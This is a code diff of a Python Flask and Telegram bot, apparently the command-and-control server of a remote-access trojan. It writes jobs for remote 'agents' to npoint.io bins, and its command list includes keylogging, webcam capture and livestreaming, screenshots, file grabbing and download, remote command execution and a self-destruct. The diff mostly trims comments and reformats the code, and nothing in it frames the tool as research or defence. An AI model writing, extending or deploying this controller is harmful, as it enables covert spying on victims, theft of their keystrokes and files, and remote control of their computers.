@@ -23,10 +23,10 @@ STATE_URL = "https://api.npoint.io/c2be443695998be48b75"
 # Initialize the Flask web server
 app = Flask(__name__)
 
-# Initialize the Telegram bot application (we don't run polling)
+# Initialize the Telegram bot application
 ptb_app = Application.builder().token(TOKEN).build()
 
-# --- Helper Functions for State and Jobs ---
+# --- Helper Functions ---
 
 def esc(text):
     """Safely escapes text for Telegram MarkdownV2."""
@@ -49,15 +49,10 @@ def set_state(target_id):
         print(f"Error setting state: {e}")
 
 def post_job(target_id, command, args):
-    """Posts a command to the jobs bin for agents to pick up."""
+    """Posts a new command job to the jobs bin."""
     job = {"job_id": str(uuid.uuid4()), "target_id": target_id, "command": command, "args": args}
     try:
-        # We now post a LIST containing the new job, which replaces the bin's content.
-        # This is a simple way to manage the job queue; a more robust system might append.
-        # For npoint, POSTing replaces the content.
-        # To simulate appending, we would need to GET, append, then POST.
-        # For simplicity, we assume agents clear the queue or we can just post the latest job.
-        # A better approach for multiple jobs:
+        # Fetch the current list of jobs
         try:
             current_jobs = requests.get(JOBS_URL, timeout=5).json()
             if not isinstance(current_jobs, list):
@@ -65,6 +60,7 @@ def post_job(target_id, command, args):
         except:
             current_jobs = []
         
+        # Append the new job and post the updated list back
         current_jobs.append(job)
         requests.post(JOBS_URL, json=current_jobs, timeout=5)
         return True
@@ -78,7 +74,7 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Displays the help menu."""
     help_text = (
         "__**Vercel Controller Help**__\n\n"
-        "This bot runs on Vercel and uses webhooks\\. It posts jobs for remote agents\\.\n\n"
+        "This bot uses webhooks to post jobs for remote agents\\.\n\n"
         "__🎯 **Core Controls**__\n"
         "`/target <id|all|clear>` \\- Select which agent\\(s\\) to command\\.\n"
         "`/help` \\- Shows this help message\\.\n\n"
@@ -94,7 +90,7 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(help_text, parse_mode='MarkdownV2')
 
 async def cmd_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Sets the target agent ID by writing it to the state bin."""
+    """Sets the target agent ID."""
     target_id = " ".join(context.args).lower() if context.args else None
     if not target_id:
         current_target = get_state() or "None"
@@ -132,7 +128,6 @@ async def cmd_destroy(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text("❌ Error: Failed to dispatch self\\-destruct job.")
 
-
 async def generic_command_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handles all other commands by posting them as jobs."""
     selected_target = get_state()
@@ -148,17 +143,12 @@ async def generic_command_handler(update: Update, context: ContextTypes.DEFAULT_
     else:
         await update.message.reply_text("❌ Error: Failed to dispatch job.")
 
-# --- Register handlers with the python-telegram-bot application ---
+# --- Register handlers ---
 ptb_app.add_handler(CommandHandler("help", cmd_help))
 ptb_app.add_handler(CommandHandler("target", cmd_target))
 ptb_app.add_handler(CommandHandler("destroy", cmd_destroy))
 
-# List of commands to be handled by the generic dispatcher
-agent_commands = [
-    "info", "startkeylogger", "stopkeylogger", "grab", "exec", "ss", "cam", 
-    "livestream", "stoplivestream", "livecam", "stoplivecam", 
-    "ls", "cd", "pwd", "download"
-]
+agent_commands = ["info", "startkeylogger", "stopkeylogger", "grab", "exec", "ss", "cam", "livestream", "stoplivestream", "livecam", "stoplivecam", "ls", "cd", "pwd", "download"]
 for cmd in agent_commands:
     ptb_app.add_handler(CommandHandler(cmd, generic_command_handler))
 
@@ -172,5 +162,4 @@ async def process_webhook():
 
 @app.route('/', methods=['GET'])
 def health_check():
-    # This is the health-check endpoint. Your Vercel URL will show this message.
     return "Vercel controller is running.", 200
